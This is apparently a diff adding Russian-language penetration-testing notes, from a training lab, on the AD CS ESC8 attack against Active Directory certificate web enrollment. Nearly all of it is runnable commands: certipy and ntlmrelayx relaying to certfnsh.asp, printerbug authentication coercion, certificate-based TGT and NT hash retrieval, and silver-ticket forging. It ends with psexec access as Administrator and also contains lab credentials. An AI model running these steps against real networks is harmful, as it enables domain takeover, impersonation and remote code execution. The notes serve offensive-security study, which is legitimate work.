@@ -47,3 +47,100 @@ GET protected/unlimitedCubes.php Authorization: NTLM kGaXHz6/owHcWRlvGFk8ReUa1O7
 > И опубликован хотя бы один шаблон сертификата, который позволяет регистрировать компьютеры в домене и выполнять аутентификацию клиентов (например, шаблон Machine/Computer по умолчанию), 
 > То злоумышленник может взломать ЛЮБОЙ компьютер, на котором запущена служба диспетчера очереди печати!
 
+`AD CS` поддерживает различные способы регистрации, в том числе регистрацию на основе HTTP, которая позволяет пользователям запрашивать и получать сертификаты по протоколу HTTP
+
+Мы можем передать `HTTP NTLM` аутентификацию интерфейсу регистрации сертификатов — конечной точке HTTP, используемой для взаимодействия с `Certification Authority` (`CA`) ролевой службой. Ролевая служба веб-регистрации `CA` предоставляет набор веб-страниц, предназначенных для упрощения взаимодействия с `CA`. Эти конечные точки веб-регистрации обычно доступны по адресу `http://<servername>/certsrv/certfnsh.asp`. При определенных условиях мы можем использовать эти конечные точки веб-регистрации для запроса сертификатов с использованием сеансов аутентификации, полученных с помощью `NTLM` ретрансляции аутентификации. В случае успеха мы можем выдавать себя за пользователей, прошедших аутентификацию, и запрашивать сертификаты от их имени в `CA`
+
+Поиск уязвимостей в AD CS
+```bash
+certipy find -enabled -u 'plaintext$'@172.16.117.3 -p 'o6@ekK5#rlw2rAe' -stdout
+```
+
+**Условия для использования `ESC8` в среде, использующей `AD CS`, следующие:**
+- Уязвимая конечная точка веб-регистрации (Нет HTTPS и EPA/СBT).
+- Должен быть включен хотя бы один шаблон сертификата, позволяющий регистрировать компьютеры в домене и выполнять аутентификацию клиентов (например, шаблон «Машина/компьютер» по умолчанию).
+
+# Проведение атаки
+
+1) Убедиться, что у нас включена вообще HTTP NTLM Auth на конечной точке
+```bash
+curl -I http://172.16.117.3/certsrv/ 
+
+HTTP/1.1 401 Unauthorized 
+Content-Length: 1293 
+Content-Type: text/html 
+Server: Microsoft-IIS/10.0 
+WWW-Authenticate: Negotiate 
+WWW-Authenticate: NTLM 
+X-Powered-By: ASP.NET 
+Date: Fri, 11 Aug 2023 20:52:44 GMT
+```
+
+## Через ntlmrelayx (дольше)
+
+2) Запускаем ретранслятор
+```bash
+sudo ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp -smb2support --adcs --template Machine
+```
+--adcs - Выполняем AD CS ретрансляционные атаки 
+--template - Указываем DomainController, если ретранслируем админа
+
+3) Принуждаем к аутентификации
+```bash
+python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30
+```
+
+3) Нам возвращается сертификат в base64 кодировке, декодируем
+```bash
+echo -n "MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDkMIIQ4DCCBxcGCSqGSIb3DQEHBqCCBwgwggcEAgEAMI<SNIP>U6EWbi/ttH4BAjUKtJ9ygRfRg==" | base64 -d > ws01.pfx
+```
+
+4) Получаем TGT и ключ шифрование
+```bash
+python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx 'INLANEFREIGHT.LOCAL/WS01$' ws01.ccache
+```
+
+5) Используем билет и ключ для генерации NT хэша
+```bash
+KRB5CCNAME=ws01.ccache python3 getnthash.py 'INLANEFREIGHT.LOCAL/WS01$' -key 917ec3b9d13dfb69e42ee05e09a5bf4ac4e52b7b677f1b22412e4deba644ebb2
+```
+
+6) Используя NT hash учетки компьютера создаем silver ticket пользователя  
+```bash
+ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator
+```
+
+7) Подключаемся с использованием билета
+```bash
+KRB5CCNAME=Administrator.ccache 
+
+psexec.py -k -no-pass ws01.inlanefreight.local
+```
+
+## Через certipy (быстрее)
+
+2) Запускаем ретранслятор
+```bash
+sudo certipy relay -target "http://172.16.117.3" -template Machine
+```
+
+3) Принуждаем к аутентификации
+```bash
+python3 printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30
+```
+
+3) Получение хэша из сертификата
+```bash
+certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
+```
+
+4) Используя NT hash учетки компьютера создаем silver ticket пользователя  
+```bash
+ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain inlanefreight.local -spn cifs/ws01.inlanefreight.local Administrator
+```
+
+5) Подключаемся с использованием билета
+```bash
+KRB5CCNAME=Administrator.ccache 
+
+psexec.py -k -no-pass ws01.inlanefreight.local
